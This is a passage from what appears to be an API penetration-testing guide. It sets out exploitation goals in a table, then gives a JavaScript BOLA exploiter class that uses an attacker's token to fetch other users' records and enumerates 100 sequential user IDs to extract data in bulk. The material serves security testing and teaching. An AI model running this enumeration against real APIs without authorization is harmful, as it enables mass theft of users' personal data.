**Key Insight:** Automated scanners find low-hanging fruit. Manual analysis finds business logic flaws and complex vulnerabilities that scanners miss.

Exploitation moves beyond identifying vulnerabilities to proving their impact. This is where you demonstrate what an attacker could actually achieve.

**Exploitation Goals:**

| Goal | Description | Impact |
|------|-------------|--------|
| **Data Extraction** | Access unauthorized data | Data breach |
| **Privilege Escalation** | Gain higher permissions | Full system compromise |
| **Account Takeover** | Access other users' accounts | Identity theft |
| **Financial Fraud** | Manipulate transactions | Monetary loss |
| **Denial of Service** | Disrupt service availability | Business interruption |

**BOLA Exploitation Chain:**

```javascript
// exploitation/bola-chain.js
class BOLAExploiter {
  constructor(baseURL) {
    this.baseURL = baseURL;
    this.findings = [];
  }

  async exploit(targetUserId, attackerToken) {
    console.log(`Attempting to access user ${targetUserId} as attacker`);

    // Step 1: Try direct access
    const response = await axios.get(`${this.baseURL}/api/users/${targetUserId}`, {
      headers: { 'Authorization': `Bearer ${attackerToken}` },
      validateStatus: () => true
    });

    if (response.status === 200) {
      this.findings.push({
        type: 'BOLA',
        severity: 'critical',
        issue: 'Direct access to user data',
        data: response.data
      });

      // Step 2: Try to extract more data
      await this.extractBatchData(targetUserId, attackerToken);
    }
  }

  async extractBatchData(startId, token) {
    console.log('Attempting batch data extraction...');
    const extracted = [];

    for (let id = startId; id < startId + 100; id++) {
      try {
        const response = await axios.get(`${this.baseURL}/api/users/${id}`, {
          headers: { 'Authorization': `Bearer ${token}` },
          validateStatus: () => true,
          timeout: 1000
        });

        if (response.status === 200) {
          extracted.push({ id, data: response.data });
        }
      } catch (error) {
        // Ignore errors
      }
    }

    if (extracted.length > 10) {
      this.findings.push({
        type: 'BOLA',
        severity: 'critical',
        issue: 'Mass data extraction possible',
        data: `Extracted ${extracted.length} user records`,
        sample: extracted.slice(0, 3)
      });
    }
  }
}

